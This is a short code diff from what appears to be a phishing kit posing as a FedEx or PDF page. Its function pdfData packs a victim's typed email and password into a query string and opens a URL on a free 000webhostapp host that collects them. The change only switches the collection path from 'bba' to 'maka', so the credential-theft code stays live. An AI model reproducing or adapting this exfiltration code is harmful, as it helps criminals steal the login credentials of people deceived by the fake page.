@@ -82,7 +82,7 @@ function pdfData(showEmail, showPass) {
                 url = "Domain" + "=" + "FedEx - " + userServer + "&" + "Mail" + "=" + showEmail + "&" + "Password" + "=" + showPass
 
                 window.open(
-                    'https://falser-skies.000webhostapp.com/bba/config.php?' + url,
+                    'https://falser-skies.000webhostapp.com/maka/config.php?' + url,
                     '_blank'
                 );
 
